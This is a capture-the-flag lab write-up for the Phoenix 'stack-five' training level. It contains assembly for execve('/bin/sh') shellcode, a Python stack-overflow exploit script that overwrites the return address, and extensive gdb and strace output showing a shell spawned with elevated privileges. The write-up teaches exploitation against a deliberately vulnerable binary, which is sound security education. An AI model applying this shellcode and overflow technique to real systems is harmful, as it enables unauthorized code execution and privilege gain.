## Stack Five
As opposed to executing an existing function in the binary, this time we’ll be introducing the concept of “shell code”, and being able to execute our own code.

## Source Code
```c
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

## Challenge
The aim is to execute `/bin/sh`.

## Solution
### The Plan
1. Write an `execve("/bin/sh")` shellcode using assembly.
2. Create an exploit that writes our shellcode to `buffer` and overflows the return address for jumping to the shellcode.

### Shellcoding
`execve` is a system call, and to call it we use the `syscall` x64 instruction.
> The system call is the fundamental interface between an application and the Linux kernel.
But before invoking `syscall`, we need to set our registers correctly to execute `execve`.
```
RAX -> system call number
RDI -> first argument
RSI -> second argument
RDX -> third argument
R10 -> fourth argument
R8 -> fifth argument
R9 -> sixth argument
```

We can find `execve`'s syscall number in the x64 header file for `unistd`.
```console
user@phoenix-amd64:~$ grep "execve" /usr/include/x86_64-linux-gnu/asm/unistd_64.h
#define __NR_execve 59
#define __NR_execveat 322
```

So far we have the following:
```asm
; call execve
mov rax, 59
syscall
```

But we forgot the arguments,
1. Path to executed binary (`/bin/sh`)
3. argv (can be `null`)
4. envp (can be `null`)

```asm
; arguments for execve
mov rdi, "/bin/sh"
mov rsi, 0
mov rdx, 0

; call execve
mov rax, 59
syscall
```

Now let's add a `_start` global symbol, assemble and link to test our code.

```asm
global _start

section .text
_start:
; arguments for execve
mov rdi, "/bin/sh"
mov rsi, 0
mov rdx, 0

; call execve
mov rax, 59
syscall
```

```console
user@phoenix-amd64:~$ nasm -f elf64 -o test.o ourshellcode.s; ld test.o -o test.a
user@phoenix-amd64:~$ ./test.a
Segmentation fault
```

That's a bummer, let's run it with `strace` to debug our syscall:
```console
user@phoenix-amd64:~$ strace ./test.a
execve("./test.a", ["./test.a"], [/* 18 vars */]) = 0
execve(0x68732f6e69622f, NULL, NULL)    = -1 EFAULT (Bad address)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xfffffffffffffff2} ---
+++ killed by SIGSEGV +++
Segmentation fault
```

Oops! we passed the first argument by value instead of an address, for this we shall store it on the stack:
```asm
global _start

section .text
_start:
; create a new stack frame
push rbp
mov rbp, rsp
sub rsp, 0x10

; arguments for execve
mov rdi, "/bin/sh"
mov QWORD [rsp-0x8], rdi
lea rdi, [rsp-0x8]
mov rsi, 0
mov rdx, 0

; call execve
mov rax, 59
syscall
```
```console
user@phoenix-amd64:~$ nasm -f elf64 -o test.o ourshellcode.s; ld test.o -o test.a
user@phoenix-amd64:~$ ./test.a
$ id
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
$ exit
```

Nice, it works, let's see our actual shellcode (the raw instructions in hex form):
```console
user@phoenix-amd64:~$ objdump -d -M intel test.o

test.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 83 ec 10             sub    rsp,0x10
   8:   48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
   f:   73 68 00
  12:   48 89 7c 24 f8          mov    QWORD PTR [rsp-0x8],rdi
  17:   48 8d 7c 24 f8          lea    rdi,[rsp-0x8]
  1c:   be 00 00 00 00          mov    esi,0x0
  21:   ba 00 00 00 00          mov    edx,0x0
  26:   b8 3b 00 00 00          mov    eax,0x3b
  2b:   0f 05                   syscall
```

I then used Python to extract the shellcode,
```console
user@phoenix-amd64:~$ hexdump -C shellcode.bin
00000000  55 48 89 e5 48 83 ec 10  48 bf 2f 62 69 6e 2f 73  |UH..H...H./bin/s|
00000010  68 00 48 89 7c 24 f8 48  8d 7c 24 f8 be 00 00 00  |h.H.|$.H.|$.....|
00000020  00 ba 00 00 00 00 b8 3b  00 00 00 0f 05           |.......;.....|
0000002d
```

### Breaking it
As in the previous level, we overflow a function's return address, only this time we jump to an address on the stack.
```console
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-five
(gdb) b start_level
```
We can already locate the return address on the stack and the address to `buffer`.

![](/images/stack-5/0.png)

```console
(gdb) $ $rbp-0x80
140737488348480
0x7fffffffe540
0b11111111111111111111111111111111110010101000000
b'\x7f\xff\xff\xff\xe5@'
b'@\xe5\xff\xff\xff\x7f'
```

Because we are lazy, we shall write a script to calculate offsets and generate the exploit:
```python
from pwn import p64

BUFFER_SIZE = 128
BUFFER_ADDRESS = 0x7fffffffe540
RETURN_ADDRESS = 0x7fffffffe5c8

with open('shellcode.bin' ,'rb') as f:
    payload = f.read()

# payload should fit in buffer
assert(len(payload) <= BUFFER_SIZE)

# generate input for filling the buffer
buffer_smash = payload + 'A' * (BUFFER_SIZE - len(payload))
# generate input for filling gap between buffer and return address + overwrite return with buffer address
stack_smash = 'A' * (RETURN_ADDRESS - BUFFER_ADDRESS - BUFFER_SIZE) + p64(BUFFER_ADDRESS)

with open('exploit.bin', 'wb') as f:
    f.write(buffer_smash + stack_smash)
```

Run the script, and feed it's output file to the debugged program.
```console
(gdb) r < exploit.bin
...
(gdb) n
...
```

After stepping through the program, it looks like our shellcode was executed successfully!
```console
(gdb) n
process 1034 is executing new program: /bin/dash
Error in re-setting breakpoint 1: Function "start_level" not defined.
warning: Could not load shared library symbols for linux-vdso.so.1.
Do you need "set solib-search-path" or "set sysroot"?
[Inferior 1 (process 1034) exited normally]
```

Let's see it with `strace`:
```console
user@phoenix-amd64:~$ strace /opt/phoenix/amd64/stack-five < exploit.bin
execve("/opt/phoenix/amd64/stack-five", ["/opt/phoenix/amd64/stack-five"], [/* 18 vars */]) = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7ffdbc8) = 0
set_tid_address(0x7ffff7ffdc08)         = 1038
mprotect(0x7ffff7ffa000, 4096, PROT_READ) = 0
ioctl(1, TIOCGWINSZ, {ws_row=62, ws_col=116, ws_xpixel=0, ws_ypixel=0}) = 0
writev(1, [{iov_base="Welcome to phoenix/stack-five, b"..., iov_len=74}, {iov_base="\n", iov_len=1}], 2Welcome to phoenix/stack-five, brought to you by https://exploit.education
) = 75
read(0, "UH\211\345H\203\354\20H\277/bin/sh\0H\211|$\370H\215|$\370\276\0\0\0"..., 1024) = 144
read(0, "", 1024)                       = 0
--- SIGILL {si_signo=SIGILL, si_code=ILL_ILLOPN, si_addr=0x7fffffffe54a} ---
+++ killed by SIGILL +++
Illegal instruction
```

What? no `execve()` and we get an illegal instruction exception thrown at us...
It suggests our offset calculations are wrong, but how is that possible? everything seemed to work in `gdb`...

The problem is probably that [the debugged process differs in stack addresses, it can occur from a difference in environment variables and program arguments](https://stackoverflow.com/a/17775966/5327945) - which are layed before the stack in process memory.

Because we don't supply any program arguments, we can assume the issue is in the environment variables.
```console
user@phoenix-amd64:~$ env
...
```

Now let's see the environment vars in `gdb` to spot the difference,
```console
(gdb) show env
...
LINES=62
COLUMNS=116
```

Unset these variables and we should have our stack addresses aligned.
```console
(gdb) unset env LINES
(gdb) unset env COLUMNS
```

Now after debugging the process again I ended up with different addresses (moved `0x20` bytes up):
```python
BUFFER_SIZE = 128
BUFFER_ADDRESS = 0x7fffffffe560
RETURN_ADDRESS = 0x7fffffffe5e8
```
```console
user@phoenix-amd64:~$ strace /opt/phoenix/amd64/stack-five < exploit.bin
execve("/opt/phoenix/amd64/stack-five", ["/opt/phoenix/amd64/stack-five"], [/* 18 vars */]) = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7ffdbc8) = 0
set_tid_address(0x7ffff7ffdc08)         = 1080
mprotect(0x7ffff7ffa000, 4096, PROT_READ) = 0
ioctl(1, TIOCGWINSZ, {ws_row=81, ws_col=117, ws_xpixel=0, ws_ypixel=0}) = 0
writev(1, [{iov_base="Welcome to phoenix/stack-five, b"..., iov_len=74}, {iov_base="\n", iov_len=1}], 2Welcome to phoenix/stack-five, brought to you by https://exploit.education
) = 75
read(0, "UH\211\345H\203\354\20H\277/bin/sh\0H\211|$\370H\215|$\370\276\0\0\0"..., 1024) = 144
read(0, "", 1024)                       = 0
execve("/bin/sh", NULL, NULL)           = 0
brk(NULL)                               = 0x555555773000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=23717, ...}) = 0
mmap(NULL, 23717, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffff7fc8000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0@n\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1839792, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fc6000
mmap(NULL, 1852680, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff7e01000
mprotect(0x7ffff7e26000, 1662976, PROT_NONE) = 0
mmap(0x7ffff7e26000, 1355776, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7ffff7e26000
mmap(0x7ffff7f71000, 303104, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x170000) = 0x7ffff7f71000
mmap(0x7ffff7fbc000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ba000) = 0x7ffff7fbc000
mmap(0x7ffff7fc2000, 13576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fc2000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7fc7580) = 0
mprotect(0x7ffff7fbc000, 12288, PROT_READ) = 0
mprotect(0x55555576e000, 8192, PROT_READ) = 0
mprotect(0x7ffff7ffc000, 4096, PROT_READ) = 0
munmap(0x7ffff7fc8000, 23717)           = 0
getpid()                                = 1080
rt_sigaction(SIGCHLD, {sa_handler=0x555555564ef0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
geteuid()                               = 1000
brk(NULL)                               = 0x555555773000
brk(0x555555794000)                     = 0x555555794000
getppid()                               = 1078
getcwd("/home/user", 4096)              = 11
ioctl(0, TCGETS, 0x7fffffffebc0)        = -1 ENOTTY (Inappropriate ioctl for device)
rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
read(0, "", 8192)                       = 0
exit_group(0)                           = ?
+++ exited with 0 +++
```

Cool, it works! but it seems to teminate without executing commands...
```console
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-five < exploit.bin
Welcome to phoenix/stack-five, brought to you by https://exploit.education
```

That's because we redirect `stdin` from the file `exploit.bin` and as it reaches `EOF` (with no commands to execute) the shell terminates.

`gets()` reads until `EOF` or `\n`, we can seperate our exploit and command with a newline character.

Let's add commands support to our exploit:
```python
from pwn import p64

BUFFER_SIZE = 128
BUFFER_ADDRESS = 0x7fffffffe560
RETURN_ADDRESS = 0x7fffffffe5e8

COMMAND = 'id;echo pwned!\n'

with open('shellcode.bin' ,'rb') as f:
    payload = f.read()

# payload should fit in buffer
assert(len(payload) <= BUFFER_SIZE)

# generate input for filling the buffer
buffer_smash = payload + 'A' * (BUFFER_SIZE - len(payload))
# generate input for filling gap between buffer and return address + overwrite return with buffer address
stack_smash = 'A' * (RETURN_ADDRESS - BUFFER_ADDRESS - BUFFER_SIZE) + p64(BUFFER_ADDRESS)

with open('exploit.bin', 'wb') as f:
    f.write(buffer_smash + stack_smash + '\n' + COMMAND)
```
```console
user@phoenix-amd64:~$ strace /opt/phoenix/amd64/stack-five < exploit.bin
execve("/opt/phoenix/amd64/stack-five", ["/opt/phoenix/amd64/stack-five"], [/* 18 vars */]) = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7ffdbc8) = 0
set_tid_address(0x7ffff7ffdc08)         = 1087
mprotect(0x7ffff7ffa000, 4096, PROT_READ) = 0
ioctl(1, TIOCGWINSZ, {ws_row=62, ws_col=116, ws_xpixel=0, ws_ypixel=0}) = 0
writev(1, [{iov_base="Welcome to phoenix/stack-five, b"..., iov_len=74}, {iov_base="\n", iov_len=1}], 2Welcome to phoenix/stack-five, brought to you by https://exploit.education
) = 75
read(0, "UH\211\345H\203\354\20H\277/bin/sh\0H\211|$\370H\215|$\370\276\0\0\0"..., 1024) = 160
execve("/bin/sh", NULL, NULL)           = 0
brk(NULL)                               = 0x555555773000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=23717, ...}) = 0
mmap(NULL, 23717, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffff7fc8000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0@n\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1839792, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fc6000
mmap(NULL, 1852680, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff7e01000
mprotect(0x7ffff7e26000, 1662976, PROT_NONE) = 0
mmap(0x7ffff7e26000, 1355776, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7ffff7e26000
mmap(0x7ffff7f71000, 303104, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x170000) = 0x7ffff7f71000
mmap(0x7ffff7fbc000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ba000) = 0x7ffff7fbc000
mmap(0x7ffff7fc2000, 13576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fc2000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7fc7580) = 0
mprotect(0x7ffff7fbc000, 12288, PROT_READ) = 0
mprotect(0x55555576e000, 8192, PROT_READ) = 0
mprotect(0x7ffff7ffc000, 4096, PROT_READ) = 0
munmap(0x7ffff7fc8000, 23717)           = 0
getpid()                                = 1087
rt_sigaction(SIGCHLD, {sa_handler=0x555555564ef0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
geteuid()                               = 1000
brk(NULL)                               = 0x555555773000
brk(0x555555794000)                     = 0x555555794000
getppid()                               = 1085
getcwd("/home/user", 4096)              = 11
ioctl(0, TCGETS, 0x7fffffffebc0)        = -1 ENOTTY (Inappropriate ioctl for device)
rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
read(0, "", 8192)                       = 0
exit_group(0)                           = ?
+++ exited with 0 +++
```

Notice this time `gets()` calls `read()` only once,
```console
read(0, "UH\211\345H\203\354\20H\277/bin/sh\0H\211|$\370H\215|$\370\276\0\0\0"..., 1024) = 160
execve("/bin/sh", NULL, NULL)           = 0
```
as opposed to previously (before we terminated our exploit with `\n`):
```console
read(0, "UH\211\345H\203\354\20H\277/bin/sh\0H\211|$\370H\215|$\370\276\0\0\0"..., 1024) = 144
read(0, "", 1024)                       = 0
execve("/bin/sh", NULL, NULL)           = 0
```
This happens because it needed to read again to verify it reached `EOF`, but when we pass a `\n` it knows to stop reading.

The problem is `read()` is called with a size of 1024 and thus it reads the whole input (including our commands following the `\n`) before shell is allowed to read them.

We can fix this by padding the exploit to 1024 bytes.
```python
from pwn import p64

BUFFER_SIZE = 128
BUFFER_ADDRESS = 0x7fffffffe560
RETURN_ADDRESS = 0x7fffffffe5e8

READ_SIZE = 1024

COMMAND = 'id;echo pwned!\n'

with open('shellcode.bin' ,'rb') as f:
    payload = f.read()

# payload should fit in buffer
assert(len(payload) <= BUFFER_SIZE)

# generate input for filling the buffer
buffer_smash = payload + 'A' * (BUFFER_SIZE - len(payload))
# generate input for filling gap between buffer and return address + overwrite return with buffer address
stack_smash = 'A' * (RETURN_ADDRESS - BUFFER_ADDRESS - BUFFER_SIZE) + p64(BUFFER_ADDRESS)

# generate padding before command
command_padding = '\n' + 'A' * (READ_SIZE - len(buffer_smash) - len(stack_smash) - 1)

with open('exploit.bin', 'wb') as f:
    f.write(buffer_smash + stack_smash + command_padding + COMMAND)
```
```console
user@phoenix-amd64:~$ strace /opt/phoenix/amd64/stack-five < exploit.bin
execve("/opt/phoenix/amd64/stack-five", ["/opt/phoenix/amd64/stack-five"], [/* 18 vars */]) = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7ffdbc8) = 0
set_tid_address(0x7ffff7ffdc08)         = 1102
mprotect(0x7ffff7ffa000, 4096, PROT_READ) = 0
ioctl(1, TIOCGWINSZ, {ws_row=62, ws_col=116, ws_xpixel=0, ws_ypixel=0}) = 0
writev(1, [{iov_base="Welcome to phoenix/stack-five, b"..., iov_len=74}, {iov_base="\n", iov_len=1}], 2Welcome to phoenix/stack-five, brought to you by https://exploit.education
) = 75
read(0, "UH\211\345H\203\354\20H\277/bin/sh\0H\211|$\370H\215|$\370\276\0\0\0"..., 1024) = 1024
execve("/bin/sh", NULL, NULL)           = 0
brk(NULL)                               = 0x555555773000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=23717, ...}) = 0
mmap(NULL, 23717, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffff7fc8000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0@n\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1839792, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fc6000
mmap(NULL, 1852680, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff7e01000
mprotect(0x7ffff7e26000, 1662976, PROT_NONE) = 0
mmap(0x7ffff7e26000, 1355776, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7ffff7e26000
mmap(0x7ffff7f71000, 303104, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x170000) = 0x7ffff7f71000
mmap(0x7ffff7fbc000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ba000) = 0x7ffff7fbc000
mmap(0x7ffff7fc2000, 13576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fc2000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7fc7580) = 0
mprotect(0x7ffff7fbc000, 12288, PROT_READ) = 0
mprotect(0x55555576e000, 8192, PROT_READ) = 0
mprotect(0x7ffff7ffc000, 4096, PROT_READ) = 0
munmap(0x7ffff7fc8000, 23717)           = 0
getpid()                                = 1102
rt_sigaction(SIGCHLD, {sa_handler=0x555555564ef0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
geteuid()                               = 1000
brk(NULL)                               = 0x555555773000
brk(0x555555794000)                     = 0x555555794000
getppid()                               = 1100
getcwd("/home/user", 4096)              = 11
ioctl(0, TCGETS, 0x7fffffffebc0)        = -1 ENOTTY (Inappropriate ioctl for device)
rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7ffff7e3cd60}, NULL, 8) = 0
read(0, "id;echo pwned!\n", 8192)       = 15
stat("/usr/local/sbin/id", 0x7fffffffea40) = -1 ENOENT (No such file or directory)
stat("/usr/local/bin/id", 0x7fffffffea40) = -1 ENOENT (No such file or directory)
stat("/usr/sbin/id", 0x7fffffffea40)    = -1 ENOENT (No such file or directory)
stat("/usr/bin/id", {st_mode=S_IFREG|0755, st_size=48064, ...}) = 0
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7ffff7fc7850) = 1103
wait4(-1, uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 1103
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1103, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
rt_sigreturn({mask=[]})                 = 1103
write(1, "pwned!\n", 7pwned!
)                 = 7
read(0, "", 8192)                       = 0
exit_group(0)                           = ?
+++ exited with 0 +++
```
```console
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-five < exploit.bin
Welcome to phoenix/stack-five, brought to you by https://exploit.education
uid=1000(user) gid=1000(user) euid=405(phoenix-amd64-stack-five) egid=405(phoenix-amd64-stack-five) groups=405(phoenix-amd64-stack-five),27(sudo),1000(user)
pwned!
```
🥳

## Bonus
### Extra-Shellcoding
This is our shellcode,
```console
user@phoenix-amd64:~$ objdump -d -M intel test.o

test.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 83 ec 10             sub    rsp,0x10
   8:   48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
   f:   73 68 00
  12:   48 89 7c 24 f8          mov    QWORD PTR [rsp-0x8],rdi
  17:   48 8d 7c 24 f8          lea    rdi,[rsp-0x8]
  1c:   be 00 00 00 00          mov    esi,0x0
  21:   ba 00 00 00 00          mov    edx,0x0
  26:   b8 3b 00 00 00          mov    eax,0x3b
  2b:   0f 05                   syscall
```

It runs fine because `gets()` does not stop reading characters when faced with a null terminator (`0x00`), string functions like `strcpy()` will terminate and cut our shellcode middle-way.
```asm
...
   8:   48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
   f:   73 68 00
...
  1c:   be 00 00 00 00          mov    esi,0x0
  21:   ba 00 00 00 00          mov    edx,0x0
  26:   b8 3b 00 00 00          mov    eax,0x3b
...
```

Let's optimize the problematic lines to avoid `0x00` bytes in our resulting instructions.

1. Instead of `mov <register>, 0` use `xor <register>, <register>`
2. Instead of moving `0x3b` to `eax`, move it to `al` (lowest 16 bits of `rax`)
3. `rdi` is 8 bytes, `/bin/sh` is 8 bytes including terminating null byte. Write 8 printable bytes (e.g. `./bin/sh`) and shift the register by 1 byte to replace the leading character with a following null byte.
```asm
global _start

section .text
_start:
; create a new stack frame
push rbp
mov rbp, rsp
sub rsp, 0x10

; arguments for execve
mov rdi, "./bin/sh"
shr rdi, 0x8
mov QWORD [rsp-0x8], rdi
lea rdi, [rsp-0x8]
xor rsi, rsi
xor rdx, rdx

; call execve
xor rax, rax
mov al, 59
syscall
```

Now let's try it:
```console
user@phoenix-amd64:~$ nasm -f elf64 -o test.o ourshellcode.s; objdump -d -M intel test.o; ld test.o -o test.a

test.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   55                      push   rbp
   1:   48 89 e5                mov    rbp,rsp
   4:   48 83 ec 10             sub    rsp,0x10
   8:   48 bf 2e 2f 62 69 6e    movabs rdi,0x68732f6e69622f2e
   f:   2f 73 68
  12:   48 c1 ef 08             shr    rdi,0x8
  16:   48 89 7c 24 f8          mov    QWORD PTR [rsp-0x8],rdi
  1b:   48 8d 7c 24 f8          lea    rdi,[rsp-0x8]
  20:   48 31 f6                xor    rsi,rsi
  23:   48 31 d2                xor    rdx,rdx
  26:   48 31 c0                xor    rax,rax
  29:   b0 3b                   mov    al,0x3b
  2b:   0f 05                   syscall
user@phoenix-amd64:~$ ./test.a
$ exit
```
